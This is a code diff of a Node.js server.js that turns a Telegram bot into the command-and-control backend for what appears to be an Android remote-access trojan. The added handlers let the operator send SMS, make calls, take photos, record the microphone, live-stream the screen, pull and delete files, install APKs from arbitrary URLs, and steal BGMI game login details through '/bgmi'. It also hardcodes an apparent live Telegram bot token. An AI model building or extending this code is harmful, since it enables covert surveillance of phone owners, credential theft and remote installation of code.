@@ -1,350 +1,421 @@
+// server.js
+require('dotenv').config(); // If using .env locally; on Render set env variables
 const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
 const TelegramBot = require('node-telegram-bot-api');
 const { createClient } = require('@supabase/supabase-js');
 const cors = require('cors');
+const multer = require('multer'); // You may need to install: npm install multer
+const path = require('path');
+const fs = require('fs');
+const { v4: uuidv4 } = require('uuid');
 
+// --- Environment variables ---
+const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || '7357354055:AAH4W-B0qIRBRiNgts6KmeRRTUARauqwOMY';
+const SUPABASE_URL = process.env.SUPABASE_URL;      // Set in Render
+const SUPABASE_KEY = process.env.SUPABASE_KEY;      // Set in Render
+const BASE_URL = process.env.BASE_URL;              // Your Render app URL (e.g., https://your-app.onrender.com)
+const PORT = process.env.PORT || 3000;
+
+// --- Initialize Supabase ---
+const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
+
+// --- Express & HTTP server ---
 const app = express();
-const server = http.createServer(app);
-const io = new Server(server, { cors: { origin: '*' } });
-
 app.use(cors());
 app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
 
-// ==================== Environment Variables ====================
-const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
-const SUPABASE_URL = process.env.SUPABASE_URL;
-const SUPABASE_SERVICE_KEY = process.env.SUPABASE_SERVICE_KEY;
-const SERVER_URL = process.env.SERVER_URL;
+const server = http.createServer(app);
 
-if (!TELEGRAM_TOKEN || !SUPABASE_URL || !SUPABASE_SERVICE_KEY) {
-  console.error('Missing required environment variables');
-  process.exit(1);
-}
+// --- Socket.IO ---
+const io = new Server(server, {
+  cors: { origin: '*' } // Allow connections from Android client and viewer page
+});
 
-// ==================== Initialize Clients ====================
-const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_KEY);
-const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: false });
+// --- Telegram Bot (webhook mode) ---
+const bot = new TelegramBot(TELEGRAM_TOKEN);
+bot.setWebHook(`${BASE_URL}/webhook`);
 
-// Set webhook if SERVER_URL provided
-if (SERVER_URL) {
-  bot.setWebHook(`${SERVER_URL}/webhook`).then(() => {
-    console.log('Webhook set successfully');
-  }).catch(err => {
-    console.error('Failed to set webhook:', err);
+// --- In-memory stores ---
+const chatToSocket = new Map();           // chatId -> socket object
+const pendingCommands = new Map();        // requestId -> { resolve, reject, timeout }
+const streamToChat = new Map();           // streamId -> chatId (for live streams)
+
+// --- Utility: send command to device via Socket.IO with promise ---
+function sendCommandToDevice(chatId, command, params = {}, timeoutMs = 30000) {
+  return new Promise((resolve, reject) => {
+    const socket = chatToSocket.get(chatId);
+    if (!socket) {
+      return reject(new Error('Device not connected'));
+    }
+
+    const requestId = uuidv4();
+    const timeout = setTimeout(() => {
+      pendingCommands.delete(requestId);
+      reject(new Error('Command timed out'));
+    }, timeoutMs);
+
+    pendingCommands.set(requestId, { resolve, reject, timeout });
+
+    socket.emit('command', {
+      requestId,
+      command,
+      params
+    });
   });
 }
 
-// ==================== Store connected devices ====================
-const devices = new Map();           // deviceId -> socket (Android)
-const termuxClients = new Map();     // socket.id -> { socket, deviceId }
-
-// ==================== Helper: Store command result in Supabase ====================
-async function storeResult(deviceId, command, result, type = null) {
-  try {
-    const { error } = await supabase
-      .from('command_results')
-      .insert([{ device_id: deviceId, command, result, type }]);
-    if (error) throw error;
-  } catch (err) {
-    console.error('Error storing result:', err);
-  }
-}
-
-// ==================== Helper: Update device last seen ====================
-async function updateDeviceLastSeen(deviceId, info = null) {
-  try {
-    const updateData = { last_seen: new Date() };
-    if (info) updateData.info = info;
-    const { error } = await supabase
-      .from('devices')
-      .upsert({ id: deviceId, ...updateData }, { onConflict: 'id' });
-    if (error) throw error;
-  } catch (err) {
-    console.error('Error updating device:', err);
-  }
-}
-
-// ==================== Helper: Get device ID for a chat ====================
-async function getDeviceIdForChat(chatId) {
-  const { data, error } = await supabase
-    .from('devices')
-    .select('id')
-    .eq('chat_id', chatId.toString())
-    .maybeSingle();
-  if (error) {
-    console.error('Error fetching device for chat:', error);
-    return null;
-  }
-  return data?.id;
-}
-
-// ==================== Helper: Pair chat with device ====================
-async function pairChatWithDevice(chatId, deviceId) {
-  const { error } = await supabase
-    .from('devices')
-    .update({ chat_id: chatId.toString() })
-    .eq('id', deviceId);
-  if (error) {
-    console.error('Error pairing:', error);
-    return false;
-  }
-  return true;
-}
-
-// ==================== Telegram Keyboard Markup ====================
-const mainKeyboard = {
-  reply_markup: {
-    keyboard: [
-      ['/sms', '/calllog', '/location'],
-      ['/appusage', '/apps', '/camera'],
-      ['/hotspot on', '/hotspot off', '/lock'],
-      ['/unlock', '/sim', '/battery'],
-      ['/device', '/charging', '/custom'],
-      ['/listdevices', '/status', '/help']
-    ],
-    resize_keyboard: true,
-    one_time_keyboard: false
-  }
-};
-
-// ==================== WebSocket ====================
+// --- Socket.IO event handling ---
 io.on('connection', (socket) => {
   console.log('New client connected:', socket.id);
 
-  // Android device registration
+  // Register device
   socket.on('register', async (data) => {
-    const { deviceId, info } = data;
-    if (deviceId) {
-      devices.set(deviceId, socket);
-      socket.deviceId = deviceId;
-      socket.isDevice = true;
-      console.log(`✅ Device registered: ${deviceId}`);
-      await updateDeviceLastSeen(deviceId, info);
-      socket.emit('registered', { status: 'ok' });
+    const { deviceId, chatId } = data;
+    if (!deviceId || !chatId) {
+      socket.emit('error', 'Missing deviceId or chatId');
+      return;
     }
+
+    // Store mapping
+    socket.deviceId = deviceId;
+    socket.chatId = chatId;
+    chatToSocket.set(chatId, socket);
+
+    // Update Supabase: devices table (id, device_id, chat_id, last_seen)
+    await supabase.from('devices').upsert({
+      device_id: deviceId,
+      chat_id: chatId,
+      last_seen: new Date().toISOString()
+    }, { onConflict: 'chat_id' });
+
+    console.log(`Device registered: ${deviceId} for chat ${chatId}`);
+    socket.emit('registered', { status: 'ok' });
   });
 
-  // Termux client registration
-  socket.on('termuxListen', (data) => {
-    const { deviceId } = data;
-    if (deviceId) {
-      termuxClients.set(socket.id, { socket, deviceId });
-      socket.isTermux = true;
-      socket.listeningDevice = deviceId;
-      console.log(`📱 Termux client ${socket.id} listening to ${deviceId}`);
-    }
-  });
-
-  // Command result from Android
-  socket.on('commandResult', async (data) => {
-    const { command, result, chatId, type } = data;
-    const deviceId = socket.deviceId;
-    if (!deviceId) return;
-
-    await storeResult(deviceId, command, result, type);
-
-    if (chatId) {
-      bot.sendMessage(chatId, result, { parse_mode: 'HTML' }).catch(err => {
-        console.error('Failed to send Telegram message:', err);
-      });
-    }
-
-    for (const [_, client] of termuxClients) {
-      if (client.deviceId === deviceId) {
-        client.socket.emit('commandResult', { command, result, type });
+  // Response from device for a command
+  socket.on('command_response', (data) => {
+    const { requestId, success, data: result, error } = data;
+    const pending = pendingCommands.get(requestId);
+    if (pending) {
+      clearTimeout(pending.timeout);
+      pendingCommands.delete(requestId);
+      if (success) {
+        pending.resolve(result);
+      } else {
+        pending.reject(new Error(error || 'Command failed'));
       }
     }
+  });
+
+  // Live stream frames
+  socket.on('stream_frame', (data) => {
+    const { streamId, frame } = data; // frame can be base64 or binary
+    // Broadcast to all viewers in that stream room
+    io.to(streamId).emit('frame', frame);
   });
 
   socket.on('disconnect', () => {
+    // Remove from mapping
+    if (socket.chatId) {
+      chatToSocket.delete(socket.chatId);
+    }
     console.log('Client disconnected:', socket.id);
-    if (socket.isDevice && socket.deviceId) {
-      devices.delete(socket.deviceId);
-      console.log(`Device ${socket.deviceId} went offline`);
-    }
-    if (socket.isTermux) {
-      termuxClients.delete(socket.id);
-    }
   });
 });
 
-// ==================== Telegram Webhook ====================
-app.post('/webhook', async (req, res) => {
-  const update = req.body;
-  if (update.message) {
-    const chatId = update.message.chat.id;
-    const text = update.message.text;
+// --- Telegram webhook endpoint ---
+app.post('/webhook', (req, res) => {
+  bot.processUpdate(req.body);
+  res.sendStatus(200);
+});
 
-    console.log(`Telegram message from ${chatId}: ${text}`);
+// --- Telegram command handlers ---
+bot.onText(/\/start/, (msg) => {
+  const chatId = msg.chat.id;
+  bot.sendMessage(chatId,
+    '✅ Android Monitor Bot\n\n' +
+    'Connect your device via the Android app, then use commands:\n' +
+    '/sms <number> <message>\n/call <number>\n/lock\n/unlock\n/camera\n/apk <url>\n/toast <text>\n/mic <15|60|last>\n/audio <url>\n/live\n/battery\n/files\n/download <filepath>\n/delete <filepath>\n/flashlight <on|off>\n/bgmi'
+  );
+});
 
-    // Handle /start command
-    if (text === '/start') {
-      bot.sendMessage(chatId, 
-        'Welcome to Monitor Bot!\n\n' +
-        'Commands:\n' +
-        '/listdevices – Show all registered devices\n' +
-        '/pair <deviceId> – Pair this chat with a device\n' +
-        '/status – Show current paired device\n' +
-        '/help – Show this menu',
-        mainKeyboard
-      ).catch(console.error);
-      return res.sendStatus(200);
-    }
-
-    // Handle /help
-    if (text === '/help') {
-      bot.sendMessage(chatId,
-        'Commands:\n' +
-        '/listdevices – Show all devices with online status\n' +
-        '/pair <deviceId> – Pair this chat with a device\n' +
-        '/status – Show current paired device\n' +
-        '/sms, /calllog, /location, etc. – Send command to paired device'
-      ).catch(console.error);
-      return res.sendStatus(200);
-    }
-
-    // Handle /listdevices
-    if (text === '/listdevices') {
-      const { data, error } = await supabase
-        .from('devices')
-        .select('id, info, last_seen')
-        .order('last_seen', { ascending: false });
-      if (error) {
-        bot.sendMessage(chatId, 'Error fetching devices.').catch(console.error);
-        return res.sendStatus(200);
-      }
-      let msg = '📱 Registered devices:\n';
-      data.forEach((dev, i) => {
-        const status = devices.has(dev.id) ? '🟢 online' : '🔴 offline';
-        const model = dev.info?.model || 'Unknown';
-        msg += `\n${i+1}. ${dev.id} – ${model} (${status})`;
-      });
-      bot.sendMessage(chatId, msg).catch(console.error);
-      return res.sendStatus(200);
-    }
-
-    // Handle /pair
-    if (text.startsWith('/pair ')) {
-      const deviceId = text.substring(6).trim();
-      if (!deviceId) {
-        bot.sendMessage(chatId, 'Usage: /pair <deviceId>').catch(console.error);
-        return res.sendStatus(200);
-      }
-      // Check if device exists
-      const { data, error } = await supabase
-        .from('devices')
-        .select('id')
-        .eq('id', deviceId)
-        .maybeSingle();
-      if (error || !data) {
-        bot.sendMessage(chatId, 'Device not found. Use /listdevices to see available devices.').catch(console.error);
-        return res.sendStatus(200);
-      }
-      const success = await pairChatWithDevice(chatId, deviceId);
-      if (success) {
-        bot.sendMessage(chatId, `✅ Paired with device ${deviceId}. You can now send commands.`, mainKeyboard)
-          .catch(console.error);
-      } else {
-        bot.sendMessage(chatId, '❌ Failed to pair.').catch(console.error);
-      }
-      return res.sendStatus(200);
-    }
-
-    // Handle /status
-    if (text === '/status') {
-      const deviceId = await getDeviceIdForChat(chatId);
-      if (!deviceId) {
-        bot.sendMessage(chatId, 'No device paired with this chat. Use /listdevices and /pair.').catch(console.error);
-        return res.sendStatus(200);
-      }
-      const online = devices.has(deviceId);
-      const status = online ? '🟢 online' : '🔴 offline';
-      bot.sendMessage(chatId, `Paired device: ${deviceId} (${status})`).catch(console.error);
-      return res.sendStatus(200);
-    }
-
-    // Handle normal commands – get paired device
-    const deviceId = await getDeviceIdForChat(chatId);
-    if (!deviceId) {
-      bot.sendMessage(chatId, '❌ No device paired. Use /listdevices and /pair first.')
-        .catch(console.error);
-      return res.sendStatus(200);
-    }
-
-    const deviceSocket = devices.get(deviceId);
-    if (deviceSocket) {
-      deviceSocket.emit('command', { command: text, chatId });
-      console.log(`Command forwarded to device ${deviceId}`);
-      res.sendStatus(200);
-    } else {
-      bot.sendMessage(chatId, '❌ Device is offline. Please ensure it is connected.')
-        .catch(console.error);
-      console.log(`Device ${deviceId} not online`);
-      res.sendStatus(200);
-    }
-  } else {
-    res.sendStatus(200);
+bot.onText(/\/sms (.+?) (.+)/, async (msg, match) => {
+  const chatId = msg.chat.id;
+  const number = match[1];
+  const message = match[2];
+  try {
+    const result = await sendCommandToDevice(chatId, 'sms', { number, message });
+    bot.sendMessage(chatId, `✅ SMS sent: ${result}`);
+  } catch (err) {
+    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
   }
 });
 
-// ==================== Termux Command Endpoint ====================
-app.post('/sendCommand', async (req, res) => {
-  const { deviceId, command } = req.body;
-  if (!deviceId || !command) {
-    return res.status(400).json({ error: 'deviceId and command required' });
-  }
-
-  const deviceSocket = devices.get(deviceId);
-  if (deviceSocket) {
-    deviceSocket.emit('command', { command, chatId: null });
-    console.log(`Command sent to device ${deviceId} from Termux`);
-    res.json({ status: 'sent' });
-  } else {
-    const { data, error } = await supabase
-      .from('devices')
-      .select('id')
-      .eq('id', deviceId)
-      .single();
-    if (data) {
-      res.status(404).json({ error: 'Device is offline' });
-    } else {
-      res.status(404).json({ error: 'Device not found' });
-    }
+bot.onText(/\/call (.+)/, async (msg, match) => {
+  const chatId = msg.chat.id;
+  const number = match[1];
+  try {
+    const result = await sendCommandToDevice(chatId, 'call', { number });
+    bot.sendMessage(chatId, `✅ Call initiated: ${result}`);
+  } catch (err) {
+    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
   }
 });
 
-// ==================== API Endpoints for Termux Device Selection ====================
-app.get('/api/devices', async (req, res) => {
-  const { data, error } = await supabase
-    .from('devices')
-    .select('*')
-    .order('last_seen', { ascending: false });
-  if (error) return res.status(500).json({ error: error.message });
-  res.json(data);
+bot.onText(/\/lock/, async (msg) => {
+  const chatId = msg.chat.id;
+  try {
+    const result = await sendCommandToDevice(chatId, 'lock', {});
+    bot.sendMessage(chatId, `✅ Device locked: ${result}`);
+  } catch (err) {
+    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
+  }
 });
 
-app.get('/api/results/:deviceId', async (req, res) => {
-  const { deviceId } = req.params;
-  const limit = parseInt(req.query.limit) || 50;
-  const { data, error } = await supabase
-    .from('command_results')
-    .select('*')
-    .eq('device_id', deviceId)
-    .order('created_at', { ascending: false })
-    .limit(limit);
-  if (error) return res.status(500).json({ error: error.message });
-  res.json(data);
+bot.onText(/\/unlock/, async (msg) => {
+  const chatId = msg.chat.id;
+  try {
+    const result = await sendCommandToDevice(chatId, 'unlock', {});
+    bot.sendMessage(chatId, `✅ Device unlocked: ${result}`);
+  } catch (err) {
+    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
+  }
 });
 
-// ==================== Health Check ====================
-app.get('/', (req, res) => {
-  res.send('Monitor Server is running with Supabase and Telegram bot');
+bot.onText(/\/camera/, async (msg) => {
+  const chatId = msg.chat.id;
+  try {
+    // Tell device to capture photo; photo will be uploaded via HTTP later
+    await sendCommandToDevice(chatId, 'camera', {});
+    bot.sendMessage(chatId, '📸 Capturing photo... It will be sent automatically.');
+  } catch (err) {
+    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
+  }
 });
 
-// ==================== Start Server ====================
-const PORT = process.env.PORT || 3000;
+bot.onText(/\/apk (.+)/, async (msg, match) => {
+  const chatId = msg.chat.id;
+  const url = match[1];
+  try {
+    const result = await sendCommandToDevice(chatId, 'install_apk', { url });
+    bot.sendMessage(chatId, `✅ APK installation started: ${result}`);
+  } catch (err) {
+    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
+  }
+});
+
+bot.onText(/\/toast (.+)/, async (msg, match) => {
+  const chatId = msg.chat.id;
+  const text = match[1];
+  try {
+    const result = await sendCommandToDevice(chatId, 'toast', { text });
+    bot.sendMessage(chatId, `✅ Toast shown: ${result}`);
+  } catch (err) {
+    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
+  }
+});
+
+bot.onText(/\/mic (.+)/, async (msg, match) => {
+  const chatId = msg.chat.id;
+  const duration = match[1]; // "15", "60", "last"
+  try {
+    await sendCommandToDevice(chatId, 'mic', { duration });
+    bot.sendMessage(chatId, `🎤 Recording ${duration} seconds... Audio will be sent.`);
+  } catch (err) {
+    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
+  }
+});
+
+bot.onText(/\/audio (.+)/, async (msg, match) => {
+  const chatId = msg.chat.id;
+  const url = match[1];
+  try {
+    const result = await sendCommandToDevice(chatId, 'play_audio', { url });
+    bot.sendMessage(chatId, `🔊 Playing audio: ${result}`);
+  } catch (err) {
+    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
+  }
+});
+
+bot.onText(/\/live/, async (msg) => {
+  const chatId = msg.chat.id;
+  try {
+    const streamId = uuidv4();
+    streamToChat.set(streamId, chatId);
+    // Tell device to start streaming with this streamId
+    await sendCommandToDevice(chatId, 'start_stream', { streamId });
+    const streamUrl = `${BASE_URL}/stream/${streamId}`;
+    bot.sendMessage(chatId, `📡 Live stream started. Open this link in your browser:\n${streamUrl}\n(60fps, low latency)`);
+  } catch (err) {
+    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
+  }
+});
+
+bot.onText(/\/battery/, async (msg) => {
+  const chatId = msg.chat.id;
+  try {
+    const result = await sendCommandToDevice(chatId, 'battery', {});
+    const { level, charging, model } = result;
+    bot.sendMessage(chatId, `🔋 Battery: ${level}%\n⚡ Charging: ${charging ? 'Yes' : 'No'}\n📱 Model: ${model}`);
+  } catch (err) {
+    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
+  }
+});
+
+bot.onText(/\/files/, async (msg) => {
+  const chatId = msg.chat.id;
+  try {
+    const result = await sendCommandToDevice(chatId, 'list_files', { path: '/' });
+    let reply = '📁 Files:\n';
+    result.files.forEach(file => {
+      reply += `- ${file.name} (${file.size} bytes)\n`;
+    });
+    bot.sendMessage(chatId, reply);
+  } catch (err) {
+    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
+  }
+});
+
+bot.onText(/\/download (.+)/, async (msg, match) => {
+  const chatId = msg.chat.id;
+  const filepath = match[1];
+  try {
+    await sendCommandToDevice(chatId, 'upload_file', { filepath });
+    bot.sendMessage(chatId, `⬇️ Downloading ${filepath}... File will be sent.`);
+  } catch (err) {
+    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
+  }
+});
+
+bot.onText(/\/delete (.+)/, async (msg, match) => {
+  const chatId = msg.chat.id;
+  const filepath = match[1];
+  try {
+    const result = await sendCommandToDevice(chatId, 'delete_file', { filepath });
+    bot.sendMessage(chatId, `✅ Deleted: ${result}`);
+  } catch (err) {
+    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
+  }
+});
+
+bot.onText(/\/flashlight (.+)/, async (msg, match) => {
+  const chatId = msg.chat.id;
+  const state = match[1]; // "on" or "off"
+  try {
+    const result = await sendCommandToDevice(chatId, 'flashlight', { state });
+    bot.sendMessage(chatId, `🔦 Flashlight turned ${state}: ${result}`);
+  } catch (err) {
+    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
+  }
+});
+
+bot.onText(/\/bgmi/, async (msg) => {
+  const chatId = msg.chat.id;
+  try {
+    const result = await sendCommandToDevice(chatId, 'bgmi_capture', {});
+    bot.sendMessage(chatId, `🎮 BGMI login details:\n${JSON.stringify(result, null, 2)}`);
+  } catch (err) {
+    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
+  }
+});
+
+// --- HTTP upload endpoints (for device to send files) ---
+const upload = multer({ dest: 'uploads/' });
+if (!fs.existsSync('uploads')) fs.mkdirSync('uploads');
+
+// Photo upload
+app.post('/upload/photo', upload.single('photo'), async (req, res) => {
+  const { chatId } = req.body;
+  if (!req.file || !chatId) {
+    return res.status(400).send('Missing file or chatId');
+  }
+  try {
+    await bot.sendPhoto(chatId, fs.createReadStream(req.file.path), { caption: '📸 Camera capture' });
+    fs.unlinkSync(req.file.path);
+    res.send('OK');
+  } catch (err) {
+    console.error('Error sending photo:', err);
+    res.status(500).send('Error');
+  }
+});
+
+// Audio upload
+app.post('/upload/audio', upload.single('audio'), async (req, res) => {
+  const { chatId } = req.body;
+  if (!req.file || !chatId) {
+    return res.status(400).send('Missing file or chatId');
+  }
+  try {
+    await bot.sendAudio(chatId, fs.createReadStream(req.file.path), { caption: '🎤 Microphone recording' });
+    fs.unlinkSync(req.file.path);
+    res.send('OK');
+  } catch (err) {
+    console.error('Error sending audio:', err);
+    res.status(500).send('Error');
+  }
+});
+
+// File upload (for download command)
+app.post('/upload/file', upload.single('file'), async (req, res) => {
+  const { chatId, filename } = req.body;
+  if (!req.file || !chatId) {
+    return res.status(400).send('Missing file or chatId');
+  }
+  try {
+    await bot.sendDocument(chatId, fs.createReadStream(req.file.path), { caption: `📄 File: ${filename || 'download'}` });
+    fs.unlinkSync(req.file.path);
+    res.send('OK');
+  } catch (err) {
+    console.error('Error sending file:', err);
+    res.status(500).send('Error');
+  }
+});
+
+// --- Live stream viewer page ---
+app.get('/stream/:streamId', (req, res) => {
+  const streamId = req.params.streamId;
+  if (!streamToChat.has(streamId)) {
+    return res.status(404).send('Stream not found');
+  }
+  // Serve a simple HTML page that connects to Socket.IO and displays frames
+  res.send(`
+    <!DOCTYPE html>
+    <html>
+    <head>
+      <title>Live Stream</title>
+      <script src="/socket.io/socket.io.js"></script>
+      <style>
+        body { margin: 0; background: black; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        img { max-width: 100%; max-height: 100%; object-fit: contain; }
+      </style>
+    </head>
+    <body>
+      <img id="live-frame" src="" />
+      <script>
+        const socket = io();
+        const streamId = "${streamId}";
+        socket.emit('join-stream', streamId);
+        socket.on('frame', (frameData) => {
+          document.getElementById('live-frame').src = 'data:image/jpeg;base64,' + frameData;
+        });
+      </script>
+    </body>
+    </html>
+  `);
+});
+
+// Socket.IO: allow viewers to join a stream room
+io.on('connection', (socket) => {
+  socket.on('join-stream', (streamId) => {
+    socket.join(streamId);
+  });
+});
+
+// --- Start server ---
 server.listen(PORT, () => {
-  console.log(`Server listening on port ${PORT}`);
+  console.log(`Server running on port ${PORT}`);
+  console.log(`Telegram webhook set to: ${BASE_URL}/webhook`);
 });
